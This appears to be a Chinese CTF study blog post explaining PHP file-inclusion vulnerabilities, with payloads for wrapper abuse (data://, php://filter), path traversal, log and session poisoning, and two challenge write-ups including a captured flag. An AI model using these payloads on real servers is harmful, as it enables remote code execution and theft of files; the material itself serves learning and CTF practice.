<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>文件包含 | jothon&#39;s blog</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="前言misc学习先放一段时间，感觉没进步了，总结一下misc知识点然后开始进击web，之前做了一些web题目，一直没有系统的整理和学习，趁着暑假有时间，那就直接开始吧！ 简介文件包含漏洞是指客户端（一般为浏览器）用户通过输入控制动态包含在服务器的文件，从而导致恶意代码的执行及敏感信息的泄露，主要包括本地文件包含LFI和远程文件包含RFI两种形式 基础常见的文件包含漏洞的形式 1234&lt;?ph">
<meta property="og:type" content="article">
<meta property="og:title" content="文件包含">
<meta property="og:url" content="https://jothon.github.io/2024/07/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
<meta property="og:site_name" content="jothon&#39;s blog">
<meta property="og:description" content="前言misc学习先放一段时间，感觉没进步了，总结一下misc知识点然后开始进击web，之前做了一些web题目，一直没有系统的整理和学习，趁着暑假有时间，那就直接开始吧！ 简介文件包含漏洞是指客户端（一般为浏览器）用户通过输入控制动态包含在服务器的文件，从而导致恶意代码的执行及敏感信息的泄露，主要包括本地文件包含LFI和远程文件包含RFI两种形式 基础常见的文件包含漏洞的形式 1234&lt;?ph">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jothon.github.io/img/1721784913663-13.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913661-1.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913661-2.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913661-3.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913661-4.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913661-5.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913661-6.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913662-7.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913662-8.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913662-9.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913662-10.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913662-11.png">
<meta property="og:image" content="https://jothon.github.io/img/1721784913662-12.png">
<meta property="article:published_time" content="2024-07-23T02:08:22.000Z">
<meta property="article:modified_time" content="2024-07-24T01:39:37.245Z">
<meta property="article:author" content="jothon">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jothon.github.io/img/1721784913663-13.png">
  
    <link rel="alternative" href="/atom.xml" title="jothon&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="[object Object]" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">jothon</a></h1>
		</hgroup>

		
			<p class="header-subtitle"></p>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
						<!-- music -->
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://benstar6666.github.io/">Benstar</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zixyd.github.io/">zlxyd</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://muxiahuo.github.io/">Glory</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://gu0f3n.github.io/">Gu0f3n</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://kugulu.github.io/">kugulu</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://shadbh.github.io/">shadbh</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://backk0m.github.io/">backk0m</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://n2ryx.github.io/">n2ryx</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zlsf-zl.github.io/">zlsf</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.yuque.com/sickle-ffnce">Sickle</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">I&#39;m a developer.</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="[object Object]" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-文件包含" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/07/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
  	<time datetime="2024-07-23T02:08:22.000Z" itemprop="datePublished">2024-07-23</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      文件包含
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>misc学习先放一段时间，感觉没进步了，总结一下misc知识点然后开始进击web，之前做了一些web题目，一直没有系统的整理和学习，趁着暑假有时间，那就直接开始吧！</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>文件包含漏洞</code>是指客户端（一般为浏览器）用户通过输入控制动态包含在服务器的文件，从而导致恶意代码的执行及敏感信息的泄露，主要包括<code>本地文件包含LFI</code>和<code>远程文件包含RFI</code>两种形式</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>常见的文件包含漏洞的形式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">include $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a><strong>目录</strong></h2><ul>
<li>PHP伪协议利用</li>
<li>日志文件包含</li>
<li>包含临时文件</li>
<li>远程文件包含</li>
</ul>
<p><strong>漏洞危害</strong></p>
<ol>
<li>读取敏感文件</li>
<li>获取webshell</li>
<li>任意命令执行</li>
<li>在某些情况下，根据LFI漏洞的性质，可以运行系统可执行文件</li>
</ol>
<p><strong>存在漏洞的函数</strong>：</p>
<ul>
<li><strong>include()</strong> 只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</li>
<li><strong>require()</strong> 只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</li>
<li><strong>include_once()</strong> 功能include()一样，区别在于当重复调用同一文件时，程序只调用一次。</li>
<li><strong>require_once()</strong> 功能require()一样，区别在于当重复调用同一文件时，程序只调用一次。</li>
</ul>
<p>文件包含功能要实现，<code>需要在PHP的配置文件php.ini中开启allow_url_include；如果是远程文件包含，则除此之外还需要开启allow_url_fopen。</code></p>
<p>考虑常见的几种包含方式</p>
<ul>
<li>同目录包含 <code>file=.htaccess</code></li>
<li>目录遍历 <code>?file=../../../../../../../../../var/lib/locate.db</code></li>
<li>日志注入 <code>?file=../../../../../../../../../var/log/apache/error.log</code></li>
<li>利用 <code>/proc/self/environ</code></li>
</ul>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>简介：</p>
<p>文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
<p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞</p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>简介：</p>
<p>目录穿越（也被称为目录遍历&#x2F;directory traversal&#x2F;path traversal）是通过使用 <code>../</code> 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等</p>
<h3 id="PHP封装协议-伪协议"><a href="#PHP封装协议-伪协议" class="headerlink" title="PHP封装协议(伪协议)"></a>PHP封装协议(伪协议)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">File://  访问本地文件系统</span><br><span class="line">http://  访问HTTPs网址</span><br><span class="line">ftp://  访问ftp URL</span><br><span class="line">Php://  访问输入输出流</span><br><span class="line">Zlib://  压缩流</span><br><span class="line">Data://  数据</span><br><span class="line">Ssh2://  security shell2</span><br><span class="line">Expect://  处理交互式的流</span><br><span class="line">Glob://  查找匹配的文件路径</span><br></pre></td></tr></table></figure>

<p>php.ini配置文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off 即不可以包含远程文件。php4存在远程包含&amp;本地包含，php5仅存在本地包含</span><br></pre></td></tr></table></figure>

<p>测试版本&gt;&#x3D;5.2</p>
<h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>作用：</p>
<p>用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。</p>
<p><code>include()/require()/include_once()/require_once()</code>参数可控的情况下</p>
<p>如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的</p>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. file://[文件的绝对路径和文件名]</span></span><br><span class="line">http://127.0.0.1/include.php?file=file://C:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#2. file://[文件的相对路径和文件名]</span></span><br><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#3. file://[网络路径和文件名]</span></span><br><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>

<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="**php:&#x2F;&#x2F;**filter"></a>**php:&#x2F;&#x2F;**<strong>filter</strong></h4><blockquote>
<p>利用<code>php://filter</code>查看源代码：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter`是一种元封装器，设计用于数据流打开时的筛选过滤应用；在文件包含中用于读取文件内容，读取后输出`base64编码`后的内容，要获取真实内容的话，`需要进行base64解码</span><br></pre></td></tr></table></figure>

<p>代码实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=../sss.php</span><br></pre></td></tr></table></figure>

<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h4><p>利用php伪协议：php:&#x2F;&#x2F;input</p>
<p>利用条件：</p>
<ol>
<li>PHP.ini 中 allow_url_include&#x3D; On php &lt;5.0 ，allow_url_include&#x3D;Off 也可以</li>
</ol>
<p><code>php://input</code>是个可以访问请求的原始数据的只读流。使用时，将要输入的数据以post方式提交</p>
<h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a><strong>data伪协议</strong></h4><p>利用php伪协议：<code>data</code></p>
<p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; 5.2</span><br><span class="line">allow_url_fopen=On &amp;&amp; allow_url_include=On</span><br></pre></td></tr></table></figure>

<p>利用代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>

<h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a><strong>phar:&#x2F;&#x2F;</strong></h4><p>phar:&#x2F;&#x2F; 数据流包装器自PHP 5.3.0起开始。这个参数是就是<code>php解压缩包</code>的一个函数，不管目标文件后缀是什么，都将其当做压缩包来解压</p>
<p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP&gt;= 5.3.0</span><br></pre></td></tr></table></figure>

<p>用法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://压缩包/内部文件</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：绝对路径或相对路径均可；压缩包只能使用<code>zip协议</code>压缩</p>
</blockquote>
<h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a><strong>zip:&#x2F;&#x2F;</strong></h4><p>zip伪协议和phar协议类似,但是用法不一样。</p>
<p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.2.17 =&lt;php &lt;= 7.0.12</span><br></pre></td></tr></table></figure>

<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]zip://xxx.png#shell.php或zip://xxx.zip#shell.php</span><br></pre></td></tr></table></figure>

<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a><strong>session文件包含</strong></h2><p>利用条件：</p>
<ol>
<li>session的存储位置可以获取 session中的内容可以被控制，传入恶意代码</li>
</ol>
<p>利用思路：</p>
<ol>
<li>通过参数name写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell</li>
<li>通过phpinfo的信息可以获取到session的存储位置</li>
</ol>
<p>此时我们利用这个页面，将用户的get数据存储到session中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$$name=$$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$$_SESSION[<span class="string">&quot;name&quot;</span>]=$$name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可见此时已经将 <strong>phpinfo</strong> 写入到 session文件中，此时我们利用文件包含漏洞去包含这个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../var/lib/php/sessions/sess_sdmofnu8knlh9jlqe89l8smduu</span><br></pre></td></tr></table></figure>

<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>常见的日志文件存储路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apache+Linux`日志默认路径：`/etc/httpd/logs/access.log`、`/var/log/httpd/access.log`、`var/log/apache2/access.log`、`var/log/apache2/error.log</span><br><span class="line">apache+win2003`日志默认路径：`D:\xampp\apache\logs\access.log`、`D:\xampp\apache\logs\error.log</span><br><span class="line">IIS6.0+win2003`默认日志文件：`C:\WINDOWS\system32\Logfiles` `IIS7.0+win2003` 默认日志文件：`%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure>

<p><code>nginx</code> 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为<code>/usr/local/nginx</code>或者<code>var/log/nginx/</code>,那日志目录就是在<code>/usr/local/nginx/logs</code>或者<code>var/log/nginx/access.log</code>下面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache+linux` 默认配置文件：`/etc/httpd/conf/httpd.conf`或`/etc/init.d/httpd` `IIS6.0+win2003`` `配置文件：`C:/Windows/system32/inetsrv/metabase.xml</span><br><span class="line">IIS7.0+WIN `配置文件：`C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure>

<h3 id="apache-nginx-报错日志"><a href="#apache-nginx-报错日志" class="headerlink" title="apache&#x2F;nginx 报错日志"></a><strong>apache</strong><strong>&#x2F;nginx 报错日志</strong></h3><p><strong>访问日志</strong></p>
<p>可利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要知道服务器日志的存储路径，且日志文件可读</span><br></pre></td></tr></table></figure>

<p>利用原理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log</span><br></pre></td></tr></table></figure>

<p>利用文件包含漏洞去包含log文件</p>
<p><img src="/img/1721784913663-13.png" alt="img"></p>
<h3 id="SSH-登录日志"><a href="#SSH-登录日志" class="headerlink" title="SSH 登录日志"></a><strong>SSH</strong> <strong>登录日志</strong></h3><p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要知道ssh-log的位置，且可读</span><br></pre></td></tr></table></figure>

<p>ssh日志默认路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/auth.log（默认情况下，所有用户都可读）</span><br><span class="line">/var/log/secure</span><br></pre></td></tr></table></figure>

<p>使用ssh客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php phpinfo();?&gt;&#x27;@IP</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721784913661-1.png" alt="img"></p>
<h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a><strong>临时文件包含</strong></h2><p>php 中上传文件，会创建临时文件。在 linux 下使用 &#x2F;tmp 目录，而在 windows 下使用 <code>c:\winsdows\temp</code> 目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p><strong>漏洞原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。</span><br><span class="line">同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。</span><br></pre></td></tr></table></figure>

<p><strong>利用原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell，这里需要利用到条件竞争</span><br></pre></td></tr></table></figure>

<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a><strong>远程文件包含</strong></h2><p>在PHP 5.2后，<code>php.ini</code>默认配置下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=off</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此时除非网站管理员开启配置 否则无法远程文件包含。在某些CTF题中可能遇到。只做了解即可</p>
</blockquote>
<h3 id="远程文件绕过技巧"><a href="#远程文件绕过技巧" class="headerlink" title="远程文件绕过技巧"></a>远程文件绕过技巧</h3><ol>
<li>问号绕过</li>
</ol>
<p>包含目标<code>PHP</code>页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://192.168.91.139/phpinfo.php?</span><br></pre></td></tr></table></figure>

<ol>
<li>#号绕过：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://192.168.91.139/phpinfo.php#</span><br></pre></td></tr></table></figure>

<h2 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h2><h3 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h3><p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
<h3 id="特殊字符绕过"><a href="#特殊字符绕过" class="headerlink" title="特殊字符绕过"></a>特殊字符绕过</h3><ul>
<li>某些情况下，读文件支持使用Shell通配符，如 <code>?</code> <code>*</code> 等</li>
<li>url中 使用 <code>?</code> <code>#</code> 可能会影响include包含的结果</li>
<li>某些情况下，unicode编码不同但是字形相近的字符有同一个效果</li>
</ul>
<p>这里也就是指的是上述的远程文件绕过技巧</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>几乎是最常用的方法，条件是 <code>magic_quotes_gpc</code> 关闭，而且php版本小于5.3.4。</p>
<p>这里先了解一下，后面在出相关讲解和例题分析</p>
<p>以下例题只涉及上述部分知识，等以后做到相关其他知识的题在补充进来</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a><strong>Web_php_include</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>strstr()：</p>
<p>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。</p>
<p>分析代码可知程序过滤掉了page&#x3D;php:&#x2F;&#x2F;</p>
<p>可以使用data伪协议</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721784913661-2.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721784913661-3.png" alt="img"></p>
<p><img src="/img/1721784913661-4.png" alt="img"></p>
<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a><strong>[极客大挑战 2019]Secret File</strong></h3><p>考察知识点：<strong>bp<strong><strong>抓包</strong></strong>，文件包含-伪协议</strong></p>
<p>查看页面源代码，发现</p>
<p><img src="/img/1721784913661-5.png" alt="img"></p>
<p>进去看看</p>
<p><img src="/img/1721784913661-6.png" alt="img"></p>
<p>仍然没啥用，再次查看源代码，发现action.php,进去看看直接到了end页面，猜测反应太快，试试抓包</p>
<p>发现secr3t.php</p>
<p><img src="/img/1721784913662-7.png" alt="img"></p>
<p>之后为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>代码解析</p>
<p>如果<code>$file</code>包含”..&#x2F;“、”tp”、”input”或”data”（不区分大小写），则脚本会输出”Oh no!”并终止执行。</p>
<p>禁用了一部分伪协议的关键词，那么就用php:&#x2F;&#x2F;filter伪协议</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p><img src="/img/1721784913662-8.png" alt="img"></p>
<p>base解密</p>
<p>flag{3dbc981c-5d2a-4f52-895b-86ae37448724}</p>
<h3 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h3><p>考点：<strong>目录扫描，data伪协议使用</strong></p>
<p><img src="/img/1721784913662-9.png" alt="img"></p>
